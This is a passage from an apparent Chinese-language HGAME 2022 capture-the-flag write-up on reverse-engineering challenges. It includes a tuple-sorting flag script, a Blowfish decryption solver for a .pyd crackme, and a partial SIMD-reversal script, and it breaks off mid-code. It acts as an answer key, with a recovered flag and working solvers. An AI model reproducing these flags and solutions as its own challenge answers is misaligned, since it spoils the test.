</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x3558</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x86BD</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x9738</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x3710</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x9779</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x2F3F</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x44DD</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x78E1</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0x9F42</span>)
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">takeSecond</span>(elem):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> elem[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">.</span>sort(key<span style="color:#f92672">=</span>takeSecond)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a:
</span></span><span style="display:flex;"><span>    print (chr(i[<span style="color:#ae81ff">0</span>]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame{B0go_50rt_is_s0_stup1d}fh32orh98sdfh23ikjsdf32</span>
</span></span></code></pre></div><h3 id="refishman">[RE]fishman</h3>
<p>pyd逆向</p>
<h4 id="定位函数">定位函数</h4>
<p>搜索字符串，能看到几个函数名</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 210; 
			flex-basis: 504px"
	>
	<a href="/post/hgame2022-writeups/fishman_findfunc.png" data-size="700x333">
		<img src="/post/hgame2022-writeups/fishman_findfunc.png"
			width="700"
			height="333"
			srcset="/post/hgame2022-writeups/fishman_findfunc_hue684703702c421b42bd3f43ae89c2d7f_34701_480x0_resize_box_3.png 480w, /post/hgame2022-writeups/fishman_findfunc_hue684703702c421b42bd3f43ae89c2d7f_34701_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>比如 <code>init</code> 函数就是 <code>sub_180002670</code></p>
<h4 id="密码算法识别求解">密码算法识别+求解</h4>
<p>查看一下 <code>init</code> 和 <code>check</code> 函数，这题使用的是 <code>blowfish</code> 密码，之前没有遇到过，所以是靠着 <code>findcrypt</code> 脚本识别出来的</p>
<p>顺便放一下搜到的加密算法源码，来源是 <a class="link" href="https://gitee.com/miao123456miao/blowfish2"  target="_blank" rel="noopener"
    >https://gitee.com/miao123456miao/blowfish2</a>（github 连不上，呜呜呜）</p>
<p>这是一个分组密码，主要的特征就是 <code>f</code> 函数</p>
<p>剩下的也没什么特别的，贴一下求解脚本吧</p>
<blockquote>
<p>ddl 师傅发现这个在 kali 上编译后会出现乱码，主要原因在于 kali 上编译后会把 low 放在低地址而 Ubuntu 会放在高地址，所以直接 <code>write(1, &amp;high, 8)</code> 就无法打印到 low，修改为 <code>write(1, &amp;high, 4); write(1, &amp;low, 4);</code> 就能解决这个问题。</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;blowfish.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">swap</span>(<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> a, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> b) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> tmp;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    tmp <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>a;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>a <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>b;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>b <span style="color:#f92672">=</span> tmp;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#a6e22e">blowfish_f</span>(<span style="color:#66d9ef">blowfish_t</span><span style="color:#f92672">*</span> container, <span style="color:#66d9ef">uint32_t</span> input) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> a, b, c, d;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> input <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>;
</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> (input <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> (input <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    d <span style="color:#f92672">=</span> input <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">0</span>][a] <span style="color:#f92672">+</span> container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">1</span>][b]) <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">2</span>][c]) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>            container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">3</span>][d];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">blowfish_cipher</span>(<span style="color:#66d9ef">blowfish_t</span><span style="color:#f92672">*</span> container, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> xl, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> xr, <span style="color:#66d9ef">uint8_t</span> mode) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> loc_xl, loc_xr;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    loc_xl <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>xl;
</span></span><span style="display:flex;"><span>    loc_xr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>xr;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_ENCRYPT) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[i];
</span></span><span style="display:flex;"><span>            loc_xr <span style="color:#f92672">=</span> <span style="color:#a6e22e">blowfish_f</span>(container, loc_xl) <span style="color:#f92672">^</span> loc_xr;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">swap</span>(<span style="color:#f92672">&amp;</span>loc_xl, <span style="color:#f92672">&amp;</span>loc_xr);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_DECRYPT) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>; i<span style="color:#f92672">--</span>) {
</span></span><span style="display:flex;"><span>            loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[i];
</span></span><span style="display:flex;"><span>            loc_xr <span style="color:#f92672">=</span> <span style="color:#a6e22e">blowfish_f</span>(container, loc_xl) <span style="color:#f92672">^</span> loc_xr;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">swap</span>(<span style="color:#f92672">&amp;</span>loc_xl, <span style="color:#f92672">&amp;</span>loc_xr);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">swap</span>(<span style="color:#f92672">&amp;</span>loc_xl, <span style="color:#f92672">&amp;</span>loc_xr);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_ENCRYPT) { 
</span></span><span style="display:flex;"><span>        loc_xr <span style="color:#f92672">=</span> loc_xr <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[PASSES];
</span></span><span style="display:flex;"><span>        loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_DECRYPT) {
</span></span><span style="display:flex;"><span>        loc_xr <span style="color:#f92672">=</span> loc_xr <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>        loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>xl <span style="color:#f92672">=</span> loc_xl;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>xr <span style="color:#f92672">=</span> loc_xr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">blowfish_t</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">blowfish_initialize</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> key, <span style="color:#66d9ef">uint32_t</span> length) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">blowfish_t</span><span style="color:#f92672">*</span> container <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">blowfish_t</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i, ii, j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> tmp, tmp_l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, tmp_r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(length <span style="color:#f92672">&gt;</span> BLOWFISH_MAX_KEY_BYTES) <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">blowfish_t</span><span style="color:#f92672">*</span>) NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">=</span> P[i];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SBOXES; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; ii<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            container<span style="color:#f92672">-&gt;</span>s[i][ii] <span style="color:#f92672">=</span> S[i][ii];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; ii<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            tmp <span style="color:#f92672">=</span> (tmp <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> key[j];
</span></span><span style="display:flex;"><span>            j<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(j <span style="color:#f92672">==</span> length) 
</span></span><span style="display:flex;"><span>                j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">=</span> container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">^</span> tmp;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">blowfish_cipher</span>(container, <span style="color:#f92672">&amp;</span>tmp_l, <span style="color:#f92672">&amp;</span>tmp_r, BLOWFISH_ENCRYPT);
</span></span><span style="display:flex;"><span>        container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">=</span> tmp_l;
</span></span><span style="display:flex;"><span>        container<span style="color:#f92672">-&gt;</span>p[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> tmp_r;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SBOXES; i<span style="color:#f92672">++</span>) {  
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; ii <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) { 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">blowfish_cipher</span>(container, <span style="color:#f92672">&amp;</span>tmp_l, <span style="color:#f92672">&amp;</span>tmp_r, BLOWFISH_ENCRYPT);
</span></span><span style="display:flex;"><span>            container<span style="color:#f92672">-&gt;</span>s[i][ii] <span style="color:#f92672">=</span> tmp_l;
</span></span><span style="display:flex;"><span>            container<span style="color:#f92672">-&gt;</span>s[i][ii<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> tmp_r;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> high, low;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">blowfish_t</span><span style="color:#f92672">*</span> container <span style="color:#f92672">=</span> <span style="color:#a6e22e">blowfish_initialize</span>(<span style="color:#e6db74">&#34;LET_U_D&#34;</span>, <span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">1416580799u</span>;
</span></span><span style="display:flex;"><span>    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">3035468667u</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">blowfish_cipher</span>(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write(1, &amp;high, 8);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">2194841726u</span>;
</span></span><span style="display:flex;"><span>    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">332656605u</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">blowfish_cipher</span>(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write(1, &amp;high, 8);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">571059727u</span>;
</span></span><span style="display:flex;"><span>    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">1498341217u</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">blowfish_cipher</span>(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write(1, &amp;high, 8);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">3107158060u</span>;
</span></span><span style="display:flex;"><span>    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">470279474u</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">blowfish_cipher</span>(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write(1, &amp;high, 8);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>blowfish.h</code> 去仓库找就行</p>
<blockquote>
<p>试了一下 pycrypto 库，解出来的有问题，可能库的实现和这个有区别，没深入研究</p>
</blockquote>
<h2 id="week4">week4</h2>
<h3 id="rehardasm">[RE]hardasm</h3>
<p>全是 simd，反着执行回去就行，或者可以试试正着用 z3 解</p>
<p>这个脚本因为有些指令的某一个参数是不变的（比如 <code>vpermd ymmX, ymm7, ymmX</code>），所以偷懒了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>asm <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">vpermd  ymm4, ymm7, ymm4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">vpermd  ymm1, ymm7, ymm1&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ymm0 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x93\xcb\xe7\x93\xa9\x81\r\xb6\xd8\xdd\x9c\x7f\xc0</span><span style="color:#e6db74">M</span><span style="color:#ae81ff">\xcd\xf0\x00\xa0\x9f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xef</span><span style="color:#e6db74">T]</span><span style="color:#ae81ff">\xef\x00\x8d\xfe</span><span style="color:#e6db74">^L</span><span style="color:#ae81ff">\xd0\xec</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>ymm1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;i</span><span style="color:#ae81ff">\xcf\x8e\xb3\xf8\x98\x90\x0b\\</span><span style="color:#e6db74">&amp;}</span><span style="color:#ae81ff">\xcf\x8c</span><span style="color:#e6db74">$</span><span style="color:#ae81ff">\x1d\x96</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x8b\xc7\xaa\xfc\xaf\xfd\x91</span><span style="color:#e6db74">F3e</span><span style="color:#ae81ff">\xb8</span><span style="color:#e6db74">#z</span><span style="color:#ae81ff">\xcd\xa5</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>ymm2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\x83\xf3\xdf\xec\x00\x8e\x92</span><span style="color:#e6db74">OL</span><span style="color:#ae81ff">\x97</span><span style="color:#e6db74">O&#39;D</span><span style="color:#ae81ff">\x7f\xa4\xe3</span><span style="color:#e6db74">N</span><span style="color:#ae81ff">\xbf</span><span style="color:#e6db74">$d</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">*T</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\xb2\x82</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\xa0\x1b\xf5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>ymm3 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb4\xc7</span><span style="color:#e6db74">lj</span><span style="color:#ae81ff">\xfb\x1f</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\xf5</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xc9\r\x1b\xb4\xe5\xff</span><span style="color:#e6db74">EN^</span><span style="color:#ae81ff">\x95</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\xef\x8e</span><span style="color:#e6db74">@</span><span style="color:#ae81ff">\x8d\x9a\xf9\xd1\x92\x8b\xbf</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xbb</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>ymm4 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xca</span><span style="color:#e6db74">}6</span><span style="color:#ae81ff">\xf7\xc5\xcb\x90\xb9</span><span style="color:#e6db74">B</span><span style="color:#ae81ff">\x96\xe0\xa5</span><span style="color:#e6db74">5sL</span><span style="color:#ae81ff">\xf7\xa9\x9d\x87\xa1\xc2</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x8b\xe8\x9a</span><span style="color:#e6db74">f</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\xe6</span><span style="color:#e6db74">%</span><span style="color:#ae81ff">\x04\xd1</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>ymm5 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\x9d\x0b</span><span style="color:#e6db74">Gy</span><span style="color:#ae81ff">\x1a\xa4\x97\x02\xbf\x13\x9e\xa0\xd2\xa4</span><span style="color:#e6db74">m?_=M4</span><span style="color:#ae81ff">\xea\xee</span><span style="color:#e6db74">Ra</span><span style="color:#ae81ff">\x97</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\xb4\x04\x91\xd8</span><span style="color:#e6db74">W&#39;</span>
</span></span><span style="display:flex;"><span>ymm6 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\x08\t\n\x02\x03\x04\x05\x0c\r\x0e\x06\x07\x0b\x0f\x00\x06\x07\x08\t\n\x02\x03\x04\x05\r\x0e\x0b\x0c\x01\x0f</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>ymm7 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpermd</span>(x, y):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    origin:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        from: b&#34;3_bh&#34; b&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">d</span><span style="color:#ae81ff">\xa8\xff\x8f\x99\xa7\x94\x9e\x9a</span><span style="color:#e6db74">)4&#34; b&#34;&#39;6</span><span style="color:#ae81ff">\xd6\x82\xc2</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xe8\xaa</span><span style="color:#e6db74">&#34; b&#34;</span><span style="color:#ae81ff">\x96</span><span style="color:#e6db74">Je</span><span style="color:#ae81ff">\xc0\x0c</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x19\xc9</span><span style="color:#e6db74">&#34;
